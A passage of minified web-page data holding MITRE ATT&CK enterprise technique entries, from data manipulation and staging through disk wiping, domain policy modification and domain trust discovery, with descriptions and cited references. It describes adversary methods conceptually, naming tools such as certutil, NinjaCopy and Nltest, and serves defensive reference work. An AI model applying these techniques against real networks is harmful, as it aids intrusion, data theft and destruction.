href='https:\u002F\u002Frhinosecuritylabs.com\u002Faws\u002Fs3-ransomware-part-1-attack-vector\u002F'\u003E[8]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:oq,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1486"},{source_name:"US-CERT Ransomware 2016",url:"https:\u002F\u002Fwww.us-cert.gov\u002Fncas\u002Falerts\u002FTA16-091A",description:"US-CERT. (2016, March 31). Alert (TA16-091A): Ransomware and Recent Variants. Retrieved March 15, 2019."},{source_name:or,url:os,description:ot},{source_name:"US-CERT NotPetya 2017",url:"https:\u002F\u002Fwww.us-cert.gov\u002Fncas\u002Falerts\u002FTA17-181A",description:"US-CERT. (2017, July 1). Alert (TA17-181A): Petya Ransomware. Retrieved March 15, 2019."},{source_name:"US-CERT SamSam 2018",url:"https:\u002F\u002Fwww.us-cert.gov\u002Fncas\u002Falerts\u002FAA18-337A",description:"US-CERT. (2018, December 3). Alert (AA18-337A): SamSam Ransomware. Retrieved March 15, 2019."},{source_name:"Rhino S3 Ransomware Part 1",url:"https:\u002F\u002Frhinosecuritylabs.com\u002Faws\u002Fs3-ransomware-part-1-attack-vector\u002F",description:"Gietzen, S. (n.d.). S3 Ransomware Part 1: Attack Vector. Retrieved April 14, 2021."}],tactics:[j]},{id:bv,"object-type":a,name:"Data Manipulation",description:"Adversaries may insert, delete, or manipulate data in order to manipulate external outcomes or hide activity. By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.\n\nThe type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",external_references:[{source_name:b,external_id:bv,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1565"}],tactics:[j],subtechniques:[ou,ow,oy]},{id:bw,"object-type":a,name:"Data Obfuscation",description:"Adversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols. ",external_references:[{source_name:b,external_id:bw,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1001"},{url:f,description:g,source_name:h}],tactics:[o],subtechniques:[oA,oC,oE]},{id:cA,"object-type":a,name:"Data Staged",description:"Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1560'\u003EArchive Collected Data\u003C\u002Fa\u003E. Interactive command shells may be used, and common functionality within \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0106'\u003Ecmd\u003C\u002Fa\u003E and bash may be used to copy data into a staging location.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.pwc.co.uk\u002Fcyber-security\u002Fpdf\u002Fcloud-hopper-report-final-v4.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1578\u002F002'\u003ECreate Cloud Instance\u003C\u002Fa\u003E and stage data in that instance.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcontent.fireeye.com\u002Fm-trends\u002Frpt-m-trends-2020'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAdversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.",external_references:[{source_name:b,external_id:cA,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1074"},{source_name:"PWC Cloud Hopper April 2017",description:"PwC and BAE Systems. (2017, April). Operation Cloud Hopper. Retrieved April 5, 2017.",url:"https:\u002F\u002Fwww.pwc.co.uk\u002Fcyber-security\u002Fpdf\u002Fcloud-hopper-report-final-v4.pdf"},{source_name:am,url:an,description:ao}],tactics:[m],subtechniques:[oH,oJ]},{id:oL,"object-type":a,name:"Data Transfer Size Limits",description:"An adversary may exfiltrate data in fixed size chunks instead of whole files or limit packet sizes below certain thresholds. This approach may be used to avoid triggering network data transfer threshold alerts.",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1030",external_id:oL},{url:f,description:g,source_name:h}],tactics:[J]},{id:oM,"object-type":a,name:"Data from Cloud Storage Object",description:"Adversaries may access data objects from improperly secured cloud storage.\n\nMany cloud service providers offer solutions for online data storage such as Amazon S3, Azure Storage, and Google Cloud Storage. These solutions differ from other storage solutions (such as SQL or Elasticsearch) in that there is no overarching application. Data from these solutions can be retrieved directly using the cloud provider's APIs. Solution providers typically offer security guides to help end users configure systems.\u003Csup\u003E\u003Ca href='https:\u002F\u002Faws.amazon.com\u002Fpremiumsupport\u002Fknowledge-center\u002Fsecure-s3-resources\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fazure\u002Fstorage\u002Fcommon\u002Fstorage-security-guide'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fcloud.google.com\u002Fstorage\u002Fdocs\u002Fbest-practices'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nMisconfiguration by end users is a common problem. There have been numerous incidents where cloud storage has been improperly secured (typically by unintentionally allowing public access by unauthenticated users or overly-broad access by all users), allowing open access to credit cards, personally identifiable information, medical records, and other sensitive information.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.trendmicro.com\u002Fvinfo\u002Fus\u002Fsecurity\u002Fnews\u002Fvirtualization-and-cloud\u002Fa-misconfigured-amazon-s3-exposed-almost-50-thousand-pii-in-australia'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.wired.com\u002Fstory\u002Fmagecart-amazon-cloud-hacks\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.hipaajournal.com\u002F47gb-medical-records-unsecured-amazon-s3-bucket\u002F'\u003E[6]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries may also obtain leaked credentials in source repositories, logs, or other means as a way to gain access to cloud storage objects that have access permission controls.",external_references:[{external_id:oM,source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1530"},{source_name:"Amazon S3 Security, 2019",url:"https:\u002F\u002Faws.amazon.com\u002Fpremiumsupport\u002Fknowledge-center\u002Fsecure-s3-resources\u002F",description:"Amazon. (2019, May 17). How can I secure the files in my Amazon S3 bucket?. Retrieved October 4, 2019."},{source_name:"Microsoft Azure Storage Security, 2019",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fazure\u002Fstorage\u002Fcommon\u002Fstorage-security-guide",description:"Amlekar, M., Brooks, C., Claman, L., et. al.. (2019, March 20). Azure Storage security guide. Retrieved October 4, 2019."},{source_name:"Google Cloud Storage Best Practices, 2019",url:"https:\u002F\u002Fcloud.google.com\u002Fstorage\u002Fdocs\u002Fbest-practices",description:"Google. (2019, September 16). Best practices for Cloud Storage. Retrieved October 4, 2019."},{source_name:"Trend Micro S3 Exposed PII, 2017",url:"https:\u002F\u002Fwww.trendmicro.com\u002Fvinfo\u002Fus\u002Fsecurity\u002Fnews\u002Fvirtualization-and-cloud\u002Fa-misconfigured-amazon-s3-exposed-almost-50-thousand-pii-in-australia",description:"Trend Micro. (2017, November 6). A Misconfigured Amazon S3 Exposed Almost 50 Thousand PII in Australia. Retrieved October 4, 2019."},{source_name:"Wired Magecart S3 Buckets, 2019",url:"https:\u002F\u002Fwww.wired.com\u002Fstory\u002Fmagecart-amazon-cloud-hacks\u002F",description:"Barrett, B.. (2019, July 11). Hack Brief: A Card-Skimming Hacker Group Hit 17K Domains—and Counting. Retrieved October 4, 2019."},{source_name:"HIPAA Journal S3 Breach, 2017",url:"https:\u002F\u002Fwww.hipaajournal.com\u002F47gb-medical-records-unsecured-amazon-s3-bucket\u002F",description:"HIPAA Journal. (2017, October 11). 47GB of Medical Records and Test Results Found in Unsecured Amazon S3 Bucket. Retrieved October 4, 2019."}],tactics:[m]},{id:cB,"object-type":a,name:"Data from Configuration Repository",description:"Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.us-cert.gov\u002Fncas\u002Falerts\u002FTA18-106A'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fus-cert.cisa.gov\u002Fncas\u002Falerts\u002FTA17-156A'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:cB,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1602"},{source_name:dX,url:dY,description:dZ},{source_name:"US-CERT TA17-156A SNMP Abuse 2017",url:"https:\u002F\u002Fus-cert.cisa.gov\u002Fncas\u002Falerts\u002FTA17-156A",description:"US-CERT. (2017, June 5). Reducing the Risk of SNMP Abuse. Retrieved October 19, 2020."},{source_name:oN,url:oO,description:oP}],tactics:[m],subtechniques:[oQ,oV]},{id:bx,"object-type":a,name:"Data from Information Repositories",description:"Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, or direct access to the target information.\n\nThe following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:\n\n* Policies, procedures, and standards\n* Physical \u002F logical network diagrams\n* System architecture diagrams\n* Technical system documentation\n* Testing \u002F development credentials\n* Work \u002F project schedules\n* Source code snippets\n* Links to network shares and other internal resources\n\nInformation stored in a repository may vary based on the specific instance or environment. Specific common information repositories include \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1213\u002F002'\u003ESharepoint\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1213\u002F001'\u003EConfluence\u003C\u002Fa\u003E, and enterprise databases such as SQL Server.",external_references:[{source_name:b,external_id:bx,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1213"},{url:oX,description:oY,source_name:oZ},{url:o_,description:o$,source_name:pa}],tactics:[m],subtechniques:[pb,pd]},{id:pf,"object-type":a,name:"Data from Local System",description:"Adversaries may search local system sources, such as file systems or local databases, to find files of interest and sensitive data prior to Exfiltration.\n\nAdversaries may do this using a \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1059'\u003ECommand and Scripting Interpreter\u003C\u002Fa\u003E, such as \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0106'\u003Ecmd\u003C\u002Fa\u003E, which has functionality to interact with the file system to gather information. Some adversaries may also use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1119'\u003EAutomated Collection\u003C\u002Fa\u003E on the local system.\n",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1005",external_id:pf}],tactics:[m]},{id:pg,"object-type":a,name:"Data from Network Shared Drive",description:"Adversaries may search network shares on computers they have compromised to find files of interest. Sensitive data can be collected from remote systems via shared network drives (host shared directory, network file server, etc.) that are accessible from the current system prior to Exfiltration. Interactive command shells may be in use, and common functionality within \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0106'\u003Ecmd\u003C\u002Fa\u003E may be used to gather information.",external_references:[{source_name:b,external_id:pg,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1039"},{external_id:ph,source_name:c,url:pi}],tactics:[m]},{id:pj,"object-type":a,name:"Data from Removable Media",description:"Adversaries may search connected removable media on computers they have compromised to find files of interest. Sensitive data can be collected from any removable media (optical disk drive, USB memory, etc.) connected to the compromised system prior to Exfiltration. Interactive command shells may be in use, and common functionality within \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0106'\u003Ecmd\u003C\u002Fa\u003E may be used to gather information. \n\nSome adversaries may also use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1119'\u003EAutomated Collection\u003C\u002Fa\u003E on removable media.",external_references:[{source_name:b,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1025",external_id:pj}],tactics:[m]},{id:cC,"object-type":a,name:"Defacement",description:"Adversaries may modify visual content available internally or externally to an enterprise network. Reasons for \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1491'\u003EDefacement\u003C\u002Fa\u003E include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1491'\u003EDefacement\u003C\u002Fa\u003E in order to cause user discomfort, or to pressure compliance with accompanying messages. \n",external_references:[{source_name:b,external_id:cC,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1491"}],tactics:[j],subtechniques:[pk,pm]},{id:po,"object-type":a,name:"Deobfuscate\u002FDecode Files or Information",description:"Adversaries may use \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1027'\u003EObfuscated Files or Information\u003C\u002Fa\u003E to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is use of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0160'\u003Ecertutil\u003C\u002Fa\u003E to decode a remote access tool portable executable file that has been hidden inside a certificate file. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.malwarebytes.com\u002Fcybercrime\u002Fsocial-engineering-cybercrime\u002F2017\u002F03\u002Fnew-targeted-attack-saudi-arabia-government\u002F'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Another example is using the Windows \u003Ccode\u003Ecopy \u002Fb\u003C\u002Fcode\u003E command to reassemble binary fragments into a malicious payload. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.carbonblack.com\u002F2016\u002F09\u002F23\u002Fsecurity-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1204'\u003EUser Execution\u003C\u002Fa\u003E. The user may also be required to input a password to open a password protected compressed\u002Fencrypted file that was provided by the adversary. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.volexity.com\u002Fblog\u002F2016\u002F11\u002F09\u002Fpowerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:po,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1140"},{url:"https:\u002F\u002Fblog.malwarebytes.com\u002Fcybercrime\u002Fsocial-engineering-cybercrime\u002F2017\u002F03\u002Fnew-targeted-attack-saudi-arabia-government\u002F",description:"Malwarebytes Labs. (2017, March 27). New targeted attack against Saudi Arabia Government. Retrieved July 3, 2017.",source_name:"Malwarebytes Targeted Attack against Saudi Arabia"},{url:pp,description:pq,source_name:pr},{url:ps,description:pt,source_name:pu}],tactics:[d]},{id:pv,"object-type":a,name:"Deploy Container",description:"Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment.\n\nContainers can be deployed by various means, such as via Docker's \u003Ccode\u003Ecreate\u003C\u002Fcode\u003E and \u003Ccode\u003Estart\u003C\u002Fcode\u003E APIs or via a web application such as the Kubernetes dashboard or Kubeflow.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.docker.com\u002Fengine\u002Fapi\u002Fv1.41\u002F#tag\u002FContainer'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fkubernetes.io\u002Fdocs\u002Ftasks\u002Faccess-application-cluster\u002Fweb-ui-dashboard\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.kubeflow.org\u002Fdocs\u002Fcomponents\u002Fpipelines\u002Foverview\u002Fpipelines-overview\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.aquasec.com\u002Fmalicious-container-image-docker-container-host'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:pv,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1610"},{source_name:"Docker Containers API",url:"https:\u002F\u002Fdocs.docker.com\u002Fengine\u002Fapi\u002Fv1.41\u002F#tag\u002FContainer",description:"Docker. (n.d.). Docker Engine API v1.41 Reference - Container. Retrieved March 29, 2021."},{source_name:"Kubernetes Dashboard",url:"https:\u002F\u002Fkubernetes.io\u002Fdocs\u002Ftasks\u002Faccess-application-cluster\u002Fweb-ui-dashboard\u002F",description:"The Kubernetes Authors. (n.d.). Kubernetes Web UI (Dashboard). Retrieved March 29, 2021."},{source_name:"Kubeflow Pipelines",url:"https:\u002F\u002Fwww.kubeflow.org\u002Fdocs\u002Fcomponents\u002Fpipelines\u002Foverview\u002Fpipelines-overview\u002F",description:"The Kubeflow Authors. (n.d.). Overview of Kubeflow Pipelines. Retrieved March 29, 2021."},{source_name:lH,url:lI,description:lJ}],tactics:[d,p]},{id:aP,"object-type":a,name:"Develop Capabilities",description:"Adversaries may build capabilities that can be used during targeting. Rather than purchasing, freely downloading, or stealing capabilities, adversaries may develop their own capabilities in-house. This is the process of identifying development requirements and building solutions such as malware, exploits, and self-signed certificates. Adversaries may develop capabilities to support their operations throughout numerous phases of the adversary lifecycle.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.fireeye.com\u002Fcontent\u002Fdam\u002Ffireeye-www\u002Fservices\u002Fpdfs\u002Fmandiant-apt1-report.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fsecurelist.com\u002Fsofacy-apt-hits-high-profile-targets-with-updated-toolset\u002F72924\u002F'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.bitdefender.com\u002Ffiles\u002FNews\u002FCaseStudies\u002Fstudy\u002F353\u002FBitdefender-Whitepaper-StrongPity-APT.pdf'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fblog.talosintelligence.com\u002F2020\u002F06\u002Fpromethium-extends-with-strongpity3.html'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nAs with legitimate development efforts, different skill sets may be required for developing capabilities. The skills needed may be located in-house, or may need to be contracted out. Use of a contractor may be considered an extension of that adversary's development capabilities, provided the adversary plays a role in shaping requirements and maintains a degree of exclusivity to the capability.",external_references:[{source_name:b,external_id:aP,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1587"},{url:ai,description:aj,source_name:ak},{source_name:pw,description:px,url:py},{source_name:"Bitdefender StrongPity June 2020",url:"https:\u002F\u002Fwww.bitdefender.com\u002Ffiles\u002FNews\u002FCaseStudies\u002Fstudy\u002F353\u002FBitdefender-Whitepaper-StrongPity-APT.pdf",description:"Tudorica, R. et al. (2020, June 30). StrongPity APT - Revealing Trojanized Tools, Working Hours and Infrastructure. Retrieved July 20, 2020."},{source_name:"Talos Promethium June 2020",url:"https:\u002F\u002Fblog.talosintelligence.com\u002F2020\u002F06\u002Fpromethium-extends-with-strongpity3.html",description:"Mercer, W. et al. (2020, June 29). PROMETHIUM extends global reach with StrongPity3 APT. Retrieved July 20, 2020."}],tactics:[e],subtechniques:[pz,pC,pE,pH]},{id:pK,"object-type":a,name:"Direct Volume Access",description:"Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique bypasses Windows file access controls as well as file system monitoring tools. \u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.codeproject.com\u002FArticles\u002F32169\u002FFDump-Dumping-File-Sectors-Directly-from-Disk-usin'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\n\nUtilities, such as NinjaCopy, exist to perform these actions in PowerShell. \u003Csup\u003E\u003Ca href='https:\u002F\u002Fgithub.com\u002FPowerShellMafia\u002FPowerSploit\u002Fblob\u002Fmaster\u002FExfiltration\u002FInvoke-NinjaCopy.ps1'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:pK,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1006"},{url:"http:\u002F\u002Fwww.codeproject.com\u002FArticles\u002F32169\u002FFDump-Dumping-File-Sectors-Directly-from-Disk-usin",description:"Hakobyan, A. (2009, January 8). FDump - Dumping File Sectors Directly from Disk using Logical Offsets. Retrieved November 12, 2014.",source_name:"Hakobyan 2009"},{url:"https:\u002F\u002Fgithub.com\u002FPowerShellMafia\u002FPowerSploit\u002Fblob\u002Fmaster\u002FExfiltration\u002FInvoke-NinjaCopy.ps1",description:"Bialek, J. (2015, December 16). Invoke-NinjaCopy.ps1. Retrieved June 2, 2016.",source_name:"Github PowerSploit Ninjacopy"}],tactics:[d]},{id:cD,"object-type":a,name:"Disk Wipe",description:"Adversaries may wipe or corrupt raw disk data on specific systems or in large numbers in a network to interrupt availability to system and network resources. With direct write access to a disk, adversaries may attempt to overwrite portions of disk data. Adversaries may opt to wipe arbitrary portions of disk data and\u002For wipe disk structures like the master boot record (MBR). A complete wipe of all disk sectors may be attempted.\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware used for wiping disks may have worm-like features to propagate across a network by leveraging additional techniques like \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1078'\u003EValid Accounts\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1003'\u003EOS Credential Dumping\u003C\u002Fa\u003E, and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1021\u002F002'\u003ESMB\u002FWindows Admin Shares\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Foperationblockbuster.com\u002Fwp-content\u002Fuploads\u002F2016\u002F02\u002FOperation-Blockbuster-Destructive-Malware-Report.pdf'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:cD,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1561"},{source_name:fc,description:fd,url:fe},{url:cE,description:cF,source_name:cG}],tactics:[j],subtechniques:[pL,pN]},{id:cH,"object-type":a,name:"Domain Policy Modification",description:"Adversaries may modify the configuration settings of a domain to evade defenses and\u002For escalate privileges in domain environments. Domains provide a centralized means of managing how computer resources (ex: computers, user accounts) can act, and interact with each other, on a network. The policy of the domain also includes configuration settings that may apply between domains in a multi-domain\u002Fforest environment. Modifications to domain settings may include altering domain Group Policy Objects (GPOs) or changing trust settings for domains, including federation trusts.\n\nWith sufficient permissions, adversaries can modify domain policy settings. Since domain configuration settings control many of the interactions within the Active Directory (AD) environment, there are a great number of potential attacks that can stem from this abuse. Examples of such abuse include modifying GPOs to push a malicious \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1053\u002F005'\u003EScheduled Task\u003C\u002Fa\u003E to computers throughout the domain environment\u003Csup\u003E\u003Ca href='https:\u002F\u002Fadsecurity.org\u002F?p=2716'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwald0.com\u002F?p=179'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.harmj0y.net\u002Fblog\u002Fredteaming\u002Fabusing-gpo-permissions\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E or modifying domain trusts to include an adversary controlled domain where they can control access tokens that will subsequently be accepted by victim domain resources.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fmsrc-blog.microsoft.com\u002F2020\u002F12\u002F13\u002Fcustomer-guidance-on-recent-nation-state-cyber-attacks\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Adversaries can also change configuration settings within the AD environment to implement a \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1207'\u003ERogue Domain Controller\u003C\u002Fa\u003E.\n\nAdversaries may temporarily modify domain policy, carry out a malicious action(s), and then revert the change to remove suspicious indicators.",external_references:[{source_name:b,external_id:cH,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1484"},{source_name:pP,url:pQ,description:pR},{description:pS,url:pT,source_name:pU},{source_name:pV,url:pW,description:pX},{source_name:"Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks",url:ch,description:"MSRC. (2020, December 13). Customer Guidance on Recent Nation-State Cyber Attacks. Retrieved December 30, 2020."},{source_name:pY,url:pZ,description:p_},{source_name:"Microsoft 365 Defender Solorigate",url:"https:\u002F\u002Fwww.microsoft.com\u002Fsecurity\u002Fblog\u002F2020\u002F12\u002F28\u002Fusing-microsoft-365-defender-to-coordinate-protection-against-solorigate\u002F",description:"Microsoft 365 Defender Team. (2020, December 28). Using Microsoft 365 Defender to protect against Solorigate. Retrieved January 7, 2021."},{source_name:fm,url:fn,description:fo},{source_name:p$,url:qa,description:qb},{source_name:qc,url:qd,description:qe}],tactics:[d,u],subtechniques:[qf,qh]},{id:qm,"object-type":a,name:"Domain Trust Discovery",description:"Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain\u002Fforest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fprevious-versions\u002Fwindows\u002Fit-pro\u002Fwindows-server-2003\u002Fcc759554(v=ws.10)'\u003E[1]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1134\u002F005'\u003ESID-History Injection\u003C\u002Fa\u003E, \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1550\u002F003'\u003EPass the Ticket\u003C\u002Fa\u003E, and \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1558\u002F003'\u003EKerberoasting\u003C\u002Fa\u003E.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fadsecurity.org\u002F?p=1588'\u003E[2]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E\u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.harmj0y.net\u002Fblog\u002Fredteaming\u002Fa-guide-to-attacking-domain-trusts\u002F'\u003E[3]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E Domain trusts can be enumerated using the `DSEnumerateDomainTrusts()` Win32 API call, .NET methods, and LDAP.\u003Csup\u003E\u003Ca href='http:\u002F\u002Fwww.harmj0y.net\u002Fblog\u002Fredteaming\u002Fa-guide-to-attacking-domain-trusts\u002F'\u003E[4]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E The Windows utility \u003Ca href='https:\u002F\u002Fattack.mitre.org\u002Fsoftware\u002FS0359'\u003ENltest\u003C\u002Fa\u003E is known to be used by adversaries to enumerate domain trusts.\u003Csup\u003E\u003Ca href='https:\u002F\u002Fwww.microsoft.com\u002Fsecurity\u002Fblog\u002F2017\u002F05\u002F04\u002Fwindows-defender-atp-thwarts-operation-wilysupply-software-supply-chain-cyberattack\u002F'\u003E[5]\u003C\u002Fa\u003E\u003C\u002Fsup\u003E",external_references:[{source_name:b,external_id:qm,url:"https:\u002F\u002Fattack.mitre.org\u002Ftechniques\u002FT1482"},{source_name:"Microsoft Trusts",url:"https:\u002F\u002Fdocs.microsoft.com\u002Fen-us\u002Fprevious-versions\u002Fwindows\u002Fit-pro\u002Fwindows-server-2003\u002Fcc759554(v=ws.10)",description:"Microsoft. (2009, October 7). Trust Technologies. Retrieved February 14, 2019."},{source_name:"AdSecurity Forging Trust 